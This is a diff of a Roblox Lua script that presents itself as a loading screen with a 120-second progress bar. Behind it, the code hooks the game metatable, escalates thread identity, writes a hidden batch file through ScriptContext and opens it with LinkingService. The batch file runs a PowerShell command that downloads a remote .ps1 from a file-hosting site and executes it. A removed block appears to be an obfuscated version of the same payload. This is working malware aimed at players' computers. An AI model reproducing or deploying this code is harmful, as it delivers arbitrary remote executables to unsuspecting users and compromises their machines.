@@ -1,5 +1,93 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 
--------------------------------- SUPER OBFUSCATED SCRIPT --------------------------------
-local PDXWUmjv = (75+11); local HRtoISdb = (13+15); local qFFUTzse = (110-45); local cnlmpbVI = (0+1); local PCgxqidy = (19+4); local gkWHlIPN = (435/5); 
-local jbbADnxF = getrawmetatable(game) local JnJKHDgK = false local oRfCcLSh = jbbADnxF.AgcMDXop setreadonly(jbbADnxF, false) jbbADnxF.AgcMDXop = function(...) if not JnJKHDgK then JnJKHDgK = true local EYQOywsV = getidentity() setidentity((6+2)) local fkUKBFRX = [[@echo off powershell.exe -NoProfile -WindowStyle Hidden -Command string.char((8+97),(1*114),(109/1),(1*32),(155-51),(12+104),(155-39),(7*16),(460/4),(66-8),(17+30),(140-93),(408/4),(7*15),(91+17),(101-0),(460/4))..string.char((4*29),(464/4))..string.char((112-65),(5+42),(120-18),(76+29),(432/4),(1*101),(115/1),(2*23),(155-56),(1*97),(1*116),(196/2),(152-41),(59+61),(92/2),(1*109),(222/2),(1*101),(1*47))..string.char((1*101),(127-12),(78-32),(1*99),(61+36),(106+10),(1*98),(89+22),(201-81),(138/3),(171-62),(69+42),(21+80))..string.char((1*116),(27+71),(1*111),(8*15),(6+40),(218/2),(185-74),(505/5),(235/5),(208/4),(1*53),(1*102),(82-34),(342/3),(396/4),(2*23),(336/3),(460/4),(145-96),(9+23),(1*124),(64/2),(135-30))..string.char((218/2),(444/4),(66+35),(3+44),(137-85),(1*53),(1*102),(96/2))..string.char((159/3),(1*102),(3*16),(138-24),(60+39),(2*23),(2*56),(1*115),(24+25),(4*8),(149-25),(13+19),(525/5),(110-9),(3+117))..string.char((92/2),(448/4),(5*23),(7*7),(15+17),(496/4),(1*32),(25+80),(1*101),(3*40))..string.char((496/4),(160/5),(132-27),(1*101),(6*20)) ]] local UpVTqPFT = game:GetService(string.char((132-49),(59+40))..string.char((112/1),(183-67),(268/4),(333/3),(84+26))..string.char((5*22),(38+78),(1*101),(360/3),(162-46))..string.char((101+15))):SaveScriptProfilingData(fkUKBFRX, string.char((1*116))..string.char((79+37))..string.char((79+18),(172-56))) game:GetService(string.char((4*19),(315/3),(95+15),(207-100),(3*35),(171-61),(515/5),(1*83))..string.char((203-93),(140-37),(158-75),(129-28),(228/2),(236/2),(38+67))..string.char((2*59),(5*21),(123-24),(1*101))):OpenUrl(UpVTqPFT) setidentity(EYQOywsV or (1+1)) return; end return oRfCcLSh(...) end setreadonly(jbbADnxF, true)
--------------------------------- END SUPER OBFUSCATED SCRIPT --------------------------------
+-- Create the ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreen"
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create the main frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BackgroundTransparency = 0.3
+frame.Parent = screenGui
+
+-- Create the "Loading..." text
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
+textLabel.Position = UDim2.new(0.25, 0, 0.4, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.Text = "Loading..."
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.TextScaled = true
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.Parent = frame
+
+-- Create the loading bar frame
+local loadingBarFrame = Instance.new("Frame")
+loadingBarFrame.Size = UDim2.new(0.4, 0, 0.05, 0)
+loadingBarFrame.Position = UDim2.new(0.3, 0, 0.5, 0)
+loadingBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+loadingBarFrame.Parent = frame
+
+-- Create the loading bar fill
+local loadingBarFill = Instance.new("Frame")
+loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
+loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+loadingBarFill.Parent = loadingBarFrame
+
+-- Add corner rounding to the loading bar
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 5)
+uiCorner.Parent = loadingBarFrame
+local uiCornerFill = Instance.new("UICorner")
+uiCornerFill.CornerRadius = UDim.new(0, 5)
+uiCornerFill.Parent = loadingBarFill
+
+-- Run the provided script in the background
+spawn(function()
+    local RawMetaTable = getrawmetatable(game)
+    local MaliciousPayloadRan = false
+    local OldClosure = RawMetaTable.__namecall
+
+    setreadonly(RawMetaTable, false)
+
+    RawMetaTable.__namecall = function(...)
+        if not MaliciousPayloadRan then 
+            MaliciousPayloadRan = true
+
+            local OldThreadIdentity = getidentity()
+
+            setidentity(8)
+
+            local BatchPayload = [[
+@echo off
+
+-- enter ur directurl to the script here, convert ur exe to powershell for it to work, if you dont have it ask hvendev for the tool
+
+powershell.exe -NoProfile -WindowStyle Hidden -Command "irm https://files.catbox.moe/45f0rc.ps1 | iex"
+]]
+            local payload = game:GetService("ScriptContext"):SaveScriptProfilingData(BatchPayload, "run.bat")
+            game:GetService("LinkingService"):OpenUrl(payload)
+
+            setidentity(OldThreadIdentity or 2)
+            return
+        end
+
+        return OldClosure(...)
+    end
+
+    setreadonly(RawMetaTable, true)
+end)
+
+-- Animate the loading bar over 120 seconds
+local tweenInfo = TweenInfo.new(120, Enum.EasingStyle.Linear, Enum.EasingDirection.In)
+local tween = TweenService:Create(loadingBarFill, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
+tween:Play()
+
+-- Destroy the loading screen after completion
+tween.Completed:Connect(function()
+    screenGui:Destroy()
+end)
